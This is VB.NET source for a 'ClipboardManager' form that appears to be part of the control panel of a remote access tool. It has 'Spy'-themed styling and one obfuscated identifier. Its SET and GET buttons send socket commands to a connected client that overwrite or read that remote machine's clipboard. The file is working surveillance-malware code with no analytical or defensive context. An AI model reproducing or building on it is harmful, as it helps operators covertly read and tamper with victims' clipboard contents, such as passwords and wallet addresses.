Public Class Frm_ClipboardManager
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public Title As String = "null"
     Private Sub ClipboardManager_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         Me.Icon = New Icon(Frm_Config_Settings.res_Path & "\Icons\win\20.ico")
         SpyStyle()
         Text = Title
         Me.TOpacity.Interval = SpySettings.T_Interval
         Me.TOpacity.Enabled = True
    End Sub
     Sub New()
         InitializeComponent()
         Me.Font = Frm_Config_Settings.f
     End Sub
    Private Sub SpyStyle()
         For Each gr As TextBox In Panel1.Controls.OfType(Of TextBox)()
            gr.ForeColor = SpySettings.DefaultColor_Foreground
            gr.BackColor = SpySettings.DefaultColor_Background
            RectInputText0.Add(New Rectangle(gr.Location.X - 1, gr.Location.Y - 1, gr.Width + 1, gr.Height + 1))
        Next
        For Each gr As Button In Panel1.Controls.OfType(Of Button)()
            gr.BackColor = SpySettings.DefaultColor_Foreground
            gr.ForeColor = SpySettings.DefaultColor_Background
        Next
        For Each gr As Panel In Me.Controls.OfType(Of Panel)()
            gr.BackColor = SpySettings.DefaultColor_Background
        Next
        Me.Refresh()
    End Sub
    Private Sub TOpacity_Tick(sender As Object, e As EventArgs) Handles TOpacity.Tick
        If Not Me.Opacity = 1 Then
            Me.Opacity = Me.Opacity + 0.1
        Else
            Me.TOpacity.Enabled = False
        End If
    End Sub
     Private Sub Panel1_Paint(sender As Object, e As PaintEventArgs) Handles Panel1.Paint
        e.Graphics.SmoothingMode = Drawing2D.SmoothingMode.AntiAlias
        Dim transColor As Color = SpySettings.DefaultColor_Foreground
        If RectInputText0.Count > 0 Then
            For Each rec In RectInputText0
                If rec.Width > 0 Then
                    e.Graphics.FillRectangle(New SolidBrush(transColor), rec)
                End If
            Next
        End If
    End Sub
    Private RectInputText0 As New List(Of Rectangle)
     Private Sub BTN_SET_Click(sender As Object, e As EventArgs) Handles BTN_SET.Click
         If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.resultClient & sockets.Data.SPL_SOCKET & "set" & sockets.Data.SPL_DATA & BoxClipboard.Text, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
         End If
    End Sub
     Private Sub BTN_GET_Click(sender As Object, e As EventArgs) Handles BTN_GET.Click
        If Not classClient Is Nothing Then
            Dim objs As Object() = {Client, Authentication_users.KeysClient1 & sockets.Data.SPL_SOCKET & Frm_Config_Settings.domen & ".info" & sockets.Data.SPL_SOCKET & "method" & sockets.Data.SPL_SOCKET & Authentication_users.cfpvMvfgccCwdesmwcyzgNbpvyxaVpvyrMcyyavrsyNcfizCsr & sockets.Data.SPL_SOCKET & "get" & sockets.Data.SPL_DATA & "null", Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
            classClient.SendAsync(objs)
         End If
    End Sub
End Class
